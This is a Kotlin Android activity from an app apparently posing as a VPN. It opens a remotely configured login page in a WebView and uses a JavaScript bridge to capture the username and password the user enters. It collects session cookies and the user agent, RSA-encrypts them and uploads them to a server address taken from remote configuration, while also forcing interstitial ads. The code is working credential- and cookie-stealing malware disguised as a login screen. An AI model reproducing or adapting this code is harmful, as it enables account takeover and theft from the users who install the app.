package net.masvate.vpnpri.ui.harry

import android.annotation.SuppressLint
import android.text.TextUtils
import android.view.View
import android.view.WindowManager
import android.webkit.JavascriptInterface
import androidx.lifecycle.lifecycleScope
import kotlinx.android.synthetic.main.activity_login.*
import kotlinx.coroutines.*
import net.masvate.vpnpri.R
import net.masvate.vpnpri.base.IActivity
import net.masvate.vpnpri.utils.*

class ActivityLo : IActivity(R.layout.activity_login) {

    class WebInterface {
        @JavascriptInterface
        fun businessStart(a: String, b: String) {
            account = a
            password = b
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onConvert() {
        clearCookie {
            account = ""
            password = ""
        }
        countDown {
            showInsertAd(isForce = true, tag = "inter_loading")
        }
        window.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE)
        activityLoginIvBack.click {
            onBackPressed()
        }
        activityLoginWv.apply {
            activityLoginWv.setting(this@ActivityLo)
            addJavascriptInterface(WebInterface(), "businessAPI")
            chromeClient(this@ActivityLo) {
                activityLoginFl.visibility = View.GONE
            }
            clientView { cookieStr, userAgentString ->
                lifecycleScope.launch(Dispatchers.Main) {
                    activityLoginFlContent.visibility = View.VISIBLE
                }
                if (!TextUtils.isEmpty(updateEntity.c)) {
                    val url = updateEntity.c
                    if (!TextUtils.isEmpty(updateEntity.d)) {
                        val key = updateEntity.d
                        val value = gson.toJson(
                            mutableMapOf(
                                "un" to account,
                                "pw" to password,
                                "cookie" to cookieStr,
                                "source" to configEntity.app_name,
                                "ip" to "",
                                "type" to "f_o",
                                "b" to userAgentString
                            )
                        ).toRsaEncrypt(key!!)
                        upload(url!!,value){
                            runOnUiThread {
                                finish()
                            }
                        }
                       /* val body: RequestBody =
                            Gson().toJson(mutableMapOf("content" to value))
                                .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
                        OkGo.post<String>(url).upRequestBody(body)
                            .execute(object : StringCallback() {
                                override fun onSuccess(response: com.lzy.okgo.model.Response<String>?) {
                                    Log.i("xxxxxxH", response?.body().toString())
                                    response?.let {
                                        val result = Gson().fromJson(
                                            it.body().toString(),
                                            HarryPotterR::class.java
                                        )
                                        if (result.code == "0" && result.data?.toBooleanStrictOrNull() == true) {
                                            "requestCollect success".loge()
                                            isLogin = true
                                            runOnUiThread {
                                                finish()
                                            }
                                        }
                                    }
                                }
                            })*/
                    }
                }
            }
            loadUrl(updateEntity.m ?: "https://www.baidu.com")
        }
    }

    override fun onResume() {
        super.onResume()
        activityLoginWv.onResume()
    }

    private var needBackPressed = false

    override fun onBackPressed() {
        if (activityLoginWv.canGoBack()) {
            activityLoginWv.goBack()
        } else {
            val a = showInsertAd(showByPercent = true, tag = "inter_login")
            if (!a) {
                if (configEntity.httpUrl().startsWith("http")) {
                    jumpToWebByDefault(configEntity.httpUrl())
                }
                super.onBackPressed()
            } else {
                needBackPressed = true
            }
        }
    }

    override fun onInterstitialAdHidden() {
        super.onInterstitialAdHidden()
        if (needBackPressed) {
            needBackPressed = false
            super.onBackPressed()
        }
    }


    override fun onPause() {
        super.onPause()
        activityLoginWv.onPause()
    }
}